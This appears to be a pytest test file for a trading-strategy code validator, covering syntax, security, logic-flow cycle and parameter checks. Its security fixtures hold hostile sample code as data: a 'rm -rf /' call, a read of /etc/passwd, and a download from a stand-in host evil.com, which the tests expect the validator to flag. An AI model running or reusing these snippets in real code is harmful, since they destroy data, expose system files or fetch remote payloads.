"""
Tests for ValidationService

This module tests comprehensive code validation including:
- Python syntax validation
- Security validation (whitelist/blacklist)
- Logic flow connection validation
- Parameter validation

Following TDD methodology: RED-GREEN-REFACTOR
"""

import pytest
import pytest_asyncio
from sqlalchemy.ext.asyncio import AsyncSession

from app.modules.strategy.services.builder_validation_service import ValidationService
from app.modules.strategy.exceptions import ValidationError
from app.database.repositories.node_template_repository import NodeTemplateRepository


# ==================== Fixtures ====================

@pytest_asyncio.fixture
async def validation_service():
    """Create ValidationService instance"""
    return ValidationService()


@pytest_asyncio.fixture
async def node_template_repo(db_session: AsyncSession):
    """Create NodeTemplateRepository instance"""
    return NodeTemplateRepository(db_session)


@pytest.fixture
def valid_python_code():
    """Valid Qlib strategy code sample"""
    return '''
from qlib.strategy.base import BaseStrategy
import pandas as pd
import numpy as np
import talib

class MyStrategy(BaseStrategy):
    def __init__(self, period=20):
        super().__init__()
        self.period = period

    def generate_trade_decision(self, score, current_temp, pred_score, trade_exchange):
        """Generate trade decision"""
        ma = talib.SMA(score, timeperiod=self.period)
        signal = score > ma
        return signal.astype(int)
'''


@pytest.fixture
def invalid_syntax_code():
    """Invalid Python syntax code"""
    return '''
def invalid_function(
    # Missing closing parenthesis
    x = 1
    return x
'''


@pytest.fixture
def empty_code():
    """Empty code string"""
    return ""


@pytest.fixture
def malicious_code_eval():
    """Malicious code using eval"""
    return '''
import pandas as pd

def dangerous_function():
    user_input = "1 + 1"
    result = eval(user_input)
    return result
'''


@pytest.fixture
def malicious_code_exec():
    """Malicious code using exec"""
    return '''
import pandas as pd

def dangerous_function():
    code = "import os; os.system('ls')"
    exec(code)
'''


@pytest.fixture
def malicious_code_os_system():
    """Malicious code using os.system"""
    return '''
import os

def dangerous_function():
    os.system("rm -rf /")
'''


@pytest.fixture
def malicious_code_subprocess():
    """Malicious code using subprocess"""
    return '''
import subprocess

def dangerous_function():
    subprocess.run(["ls", "-la"])
'''


@pytest.fixture
def malicious_code_file_operation():
    """Malicious code with file operations"""
    return '''
import pandas as pd

def read_secrets():
    with open("/etc/passwd", "r") as f:
        data = f.read()
    return data
'''


@pytest.fixture
def code_with_forbidden_import():
    """Code with forbidden import"""
    return '''
import socket
import requests

def download_data():
    response = requests.get("https://evil.com/malware")
    return response.content
'''


@pytest.fixture
def code_with_allowed_imports():
    """Code with only allowed imports"""
    return '''
import numpy as np
import pandas as pd
import talib
from qlib.data import D
from qlib.strategy.base import BaseStrategy
import datetime
from typing import List

class MyStrategy(BaseStrategy):
    pass
'''


@pytest.fixture
def sample_logic_flow_valid():
    """Valid logic flow with proper connections"""
    return {
        "nodes": [
            {
                "id": "node-1",
                "type": "INDICATOR",
                "template_id": "template-1",
                "output_type": "Series"
            },
            {
                "id": "node-2",
                "type": "CONDITION",
                "template_id": "template-2",
                "input_type": "Series",
                "output_type": "Series"
            },
            {
                "id": "node-3",
                "type": "SIGNAL",
                "template_id": "template-3",
                "input_type": "Series"
            }
        ],
        "edges": [
            {
                "id": "edge-1",
                "source": "node-1",
                "target": "node-2",
                "sourcePort": "output",
                "targetPort": "input"
            },
            {
                "id": "edge-2",
                "source": "node-2",
                "target": "node-3",
                "sourcePort": "output",
                "targetPort": "input"
            }
        ]
    }


@pytest.fixture
def sample_logic_flow_with_cycle():
    """Logic flow with circular dependency"""
    return {
        "nodes": [
            {"id": "node-1", "type": "INDICATOR"},
            {"id": "node-2", "type": "CONDITION"},
            {"id": "node-3", "type": "SIGNAL"}
        ],
        "edges": [
            {"id": "edge-1", "source": "node-1", "target": "node-2"},
            {"id": "edge-2", "source": "node-2", "target": "node-3"},
            {"id": "edge-3", "source": "node-3", "target": "node-1"}  # Creates cycle
        ]
    }


@pytest.fixture
def sample_logic_flow_missing_nodes():
    """Logic flow with missing node references"""
    return {
        "nodes": [
            {"id": "node-1", "type": "INDICATOR"},
            {"id": "node-2", "type": "CONDITION"}
        ],
        "edges": [
            {"id": "edge-1", "source": "node-1", "target": "node-999"}  # node-999 doesn't exist
        ]
    }


@pytest.fixture
def sample_logic_flow_type_mismatch():
    """Logic flow with type mismatch"""
    return {
        "nodes": [
            {
                "id": "node-1",
                "type": "INDICATOR",
                "output_type": "DataFrame"
            },
            {
                "id": "node-2",
                "type": "CONDITION",
                "input_type": "Series",  # Expects Series but receives DataFrame
                "output_type": "Series"
            }
        ],
        "edges": [
            {"id": "edge-1", "source": "node-1", "target": "node-2"}
        ]
    }


# ==================== Phase 1: Syntax Validation Tests (RED) ====================

@pytest.mark.asyncio
async def test_validate_syntax_valid_code(validation_service, valid_python_code):
    """Test syntax validation with valid Python code"""
    # Act
    result = await validation_service.validate_syntax(valid_python_code)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_valid"] is True
    assert result["errors"] == []


@pytest.mark.asyncio
async def test_validate_syntax_invalid_code(validation_service, invalid_syntax_code):
    """Test syntax validation with invalid Python syntax"""
    # Act
    result = await validation_service.validate_syntax(invalid_syntax_code)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert "line" in result["errors"][0]
    assert "message" in result["errors"][0]


@pytest.mark.asyncio
async def test_validate_syntax_empty_code(validation_service, empty_code):
    """Test syntax validation with empty code"""
    # Act
    result = await validation_service.validate_syntax(empty_code)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert "empty" in result["errors"][0]["message"].lower()


# ==================== Phase 2: Security Validation Tests (RED) ====================

@pytest.mark.asyncio
async def test_validate_security_allowed_imports(validation_service, code_with_allowed_imports):
    """Test security validation with allowed imports only"""
    # Act
    result = await validation_service.validate_security(code_with_allowed_imports)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_safe"] is True
    assert result["violations"] == []


@pytest.mark.asyncio
async def test_validate_security_forbidden_imports(validation_service, code_with_forbidden_import):
    """Test security validation with forbidden imports"""
    # Act
    result = await validation_service.validate_security(code_with_forbidden_import)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_safe"] is False
    assert len(result["violations"]) > 0
    assert any(v["severity"] in ["HIGH", "CRITICAL"] for v in result["violations"])


@pytest.mark.asyncio
async def test_validate_security_eval_exec(validation_service, malicious_code_eval):
    """Test security validation detects eval/exec calls"""
    # Act
    result = await validation_service.validate_security(malicious_code_eval)

    # Assert
    assert result is not None
    assert result["is_safe"] is False
    assert len(result["violations"]) > 0
    assert any("eval" in v["message"].lower() for v in result["violations"])
    assert any(v["severity"] == "CRITICAL" for v in result["violations"])


@pytest.mark.asyncio
async def test_validate_security_exec_call(validation_service, malicious_code_exec):
    """Test security validation detects exec calls"""
    # Act
    result = await validation_service.validate_security(malicious_code_exec)

    # Assert
    assert result is not None
    assert result["is_safe"] is False
    assert len(result["violations"]) > 0
    assert any("exec" in v["message"].lower() for v in result["violations"])


@pytest.mark.asyncio
async def test_validate_security_os_system_call(validation_service, malicious_code_os_system):
    """Test security validation detects os.system calls"""
    # Act
    result = await validation_service.validate_security(malicious_code_os_system)

    # Assert
    assert result is not None
    assert result["is_safe"] is False
    assert len(result["violations"]) > 0
    # Should detect both forbidden import and dangerous call
    assert len(result["violations"]) >= 2


@pytest.mark.asyncio
async def test_validate_security_file_operations(validation_service, malicious_code_file_operation):
    """Test security validation detects file operations"""
    # Act
    result = await validation_service.validate_security(malicious_code_file_operation)

    # Assert
    assert result is not None
    assert result["is_safe"] is False
    assert len(result["violations"]) > 0
    assert any("open" in v["message"].lower() or "file" in v["message"].lower()
              for v in result["violations"])


# ==================== Phase 3: Logic Flow Validation Tests (RED) ====================

@pytest.mark.asyncio
async def test_validate_logic_flow_valid_connections(validation_service, sample_logic_flow_valid):
    """Test logic flow validation with valid connections"""
    # Act
    result = await validation_service.validate_logic_flow_connections(sample_logic_flow_valid)

    # Assert
    assert result is not None
    assert isinstance(result, dict)
    assert result["is_valid"] is True
    assert result["errors"] == []


@pytest.mark.asyncio
async def test_validate_logic_flow_missing_nodes(validation_service, sample_logic_flow_missing_nodes):
    """Test logic flow validation detects missing node references"""
    # Act
    result = await validation_service.validate_logic_flow_connections(sample_logic_flow_missing_nodes)

    # Assert
    assert result is not None
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert any("node-999" in e["message"] or "missing" in e["message"].lower()
              for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_logic_flow_type_mismatch(validation_service, sample_logic_flow_type_mismatch):
    """Test logic flow validation detects type mismatches"""
    # Act
    result = await validation_service.validate_logic_flow_connections(sample_logic_flow_type_mismatch)

    # Assert
    assert result is not None
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert any("type" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_detect_circular_dependency_found(validation_service, sample_logic_flow_with_cycle):
    """Test circular dependency detection finds cycles"""
    # Act
    result = await validation_service.detect_circular_dependency(
        sample_logic_flow_with_cycle["nodes"],
        sample_logic_flow_with_cycle["edges"]
    )

    # Assert
    assert result is not None
    assert isinstance(result, list)
    assert len(result) > 0  # Should return list of nodes in cycle
    assert "node-1" in result or "node-2" in result or "node-3" in result


@pytest.mark.asyncio
async def test_detect_circular_dependency_none(validation_service, sample_logic_flow_valid):
    """Test circular dependency detection returns None for valid flow"""
    # Act
    result = await validation_service.detect_circular_dependency(
        sample_logic_flow_valid["nodes"],
        sample_logic_flow_valid["edges"]
    )

    # Assert
    assert result is None


# ==================== Phase 4: Parameter Validation Tests (RED) ====================

@pytest.mark.asyncio
async def test_validate_node_parameters_valid(
    validation_service,
    sample_indicator_template
):
    """Test parameter validation with valid parameters"""
    # Arrange
    node = {
        "id": "node-1",
        "template_id": str(sample_indicator_template.id),
        "type": "INDICATOR"
    }
    parameters = {
        "short_period": 5,
        "long_period": 20
    }

    # Act
    result = await validation_service.validate_node_parameters(
        node,
        sample_indicator_template,
        parameters
    )

    # Assert
    assert result is not None
    assert result["is_valid"] is True
    assert result["errors"] == []


@pytest.mark.asyncio
async def test_validate_node_parameters_missing_required(
    validation_service,
    sample_indicator_template
):
    """Test parameter validation detects missing required parameters"""
    # Arrange
    node = {
        "id": "node-1",
        "template_id": str(sample_indicator_template.id),
        "type": "INDICATOR"
    }
    parameters = {
        "short_period": 5
        # missing long_period
    }

    # Act
    result = await validation_service.validate_node_parameters(
        node,
        sample_indicator_template,
        parameters
    )

    # Assert
    assert result is not None
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert any("required" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_node_parameters_type_error(
    validation_service,
    sample_indicator_template
):
    """Test parameter validation detects type errors"""
    # Arrange
    node = {
        "id": "node-1",
        "template_id": str(sample_indicator_template.id),
        "type": "INDICATOR"
    }
    parameters = {
        "short_period": "invalid",  # Should be integer
        "long_period": 20
    }

    # Act
    result = await validation_service.validate_node_parameters(
        node,
        sample_indicator_template,
        parameters
    )

    # Assert
    assert result is not None
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert any("type" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_node_parameters_out_of_range(
    validation_service,
    sample_indicator_template
):
    """Test parameter validation detects out of range values"""
    # Arrange
    node = {
        "id": "node-1",
        "template_id": str(sample_indicator_template.id),
        "type": "INDICATOR"
    }
    parameters = {
        "short_period": -5,  # Negative value (should be >= 1)
        "long_period": 20
    }

    # Act
    result = await validation_service.validate_node_parameters(
        node,
        sample_indicator_template,
        parameters
    )

    # Assert
    assert result is not None
    assert result["is_valid"] is False
    assert len(result["errors"]) > 0
    assert any("range" in e["message"].lower() or "minimum" in e["message"].lower()
              for e in result["errors"])


# ==================== Additional Coverage Tests ====================

@pytest.mark.asyncio
async def test_validate_syntax_general_exception(validation_service):
    """Test syntax validation handles general exceptions"""
    # This is difficult to trigger with normal code
    # For now, valid code passes, invalid raises SyntaxError
    # General exceptions are caught but hard to trigger in practice
    pass  # Placeholder - general exception path is defensive coding


@pytest.mark.asyncio
async def test_validate_security_with_syntax_error(validation_service):
    """Test security validation handles code with syntax errors"""
    malicious_code = "import os\ndef bad(\n  # Syntax error"

    # Act
    result = await validation_service.validate_security(malicious_code)

    # Assert
    assert result is not None
    assert result["is_safe"] is False
    assert any("syntax" in v["message"].lower() for v in result["violations"])


@pytest.mark.asyncio
async def test_validate_node_parameters_number_type(validation_service):
    """Test parameter validation for number type"""
    # Arrange
    class FakeTemplate:
        parameter_schema = {
            "type": "object",
            "properties": {
                "threshold": {"type": "number", "minimum": 0.0, "maximum": 1.0}
            },
            "required": ["threshold"]
        }

    node = {"id": "node-1", "type": "TEST"}

    # Test valid number
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"threshold": 0.5}
    )
    assert result["is_valid"] is True

    # Test invalid type
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"threshold": "invalid"}
    )
    assert result["is_valid"] is False
    assert any("type" in e["message"].lower() for e in result["errors"])

    # Test below minimum
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"threshold": -0.5}
    )
    assert result["is_valid"] is False
    assert any("minimum" in e["message"].lower() for e in result["errors"])

    # Test above maximum
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"threshold": 1.5}
    )
    assert result["is_valid"] is False
    assert any("maximum" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_node_parameters_string_type(validation_service):
    """Test parameter validation for string type with enum"""
    # Arrange
    class FakeTemplate:
        parameter_schema = {
            "type": "object",
            "properties": {
                "strategy_type": {"type": "string", "enum": ["LONG", "SHORT", "NEUTRAL"]}
            },
            "required": ["strategy_type"]
        }

    node = {"id": "node-1", "type": "TEST"}

    # Test valid string in enum
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"strategy_type": "LONG"}
    )
    assert result["is_valid"] is True

    # Test invalid type
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"strategy_type": 123}
    )
    assert result["is_valid"] is False
    assert any("type" in e["message"].lower() for e in result["errors"])

    # Test string not in enum
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"strategy_type": "INVALID"}
    )
    assert result["is_valid"] is False
    assert any("allowed values" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_node_parameters_boolean_type(validation_service):
    """Test parameter validation for boolean type"""
    # Arrange
    class FakeTemplate:
        parameter_schema = {
            "type": "object",
            "properties": {
                "enabled": {"type": "boolean"}
            },
            "required": ["enabled"]
        }

    node = {"id": "node-1", "type": "TEST"}

    # Test valid boolean
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"enabled": True}
    )
    assert result["is_valid"] is True

    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"enabled": False}
    )
    assert result["is_valid"] is True

    # Test invalid type
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"enabled": "yes"}
    )
    assert result["is_valid"] is False
    assert any("type" in e["message"].lower() for e in result["errors"])


@pytest.mark.asyncio
async def test_validate_node_parameters_integer_maximum(validation_service):
    """Test parameter validation for integer maximum value"""
    # Arrange
    class FakeTemplate:
        parameter_schema = {
            "type": "object",
            "properties": {
                "period": {"type": "integer", "minimum": 1, "maximum": 100}
            },
            "required": ["period"]
        }

    node = {"id": "node-1", "type": "TEST"}

    # Test value exceeding maximum
    result = await validation_service.validate_node_parameters(
        node, FakeTemplate(), {"period": 150}
    )
    assert result["is_valid"] is False
    assert any("maximum" in e["message"].lower() for e in result["errors"])
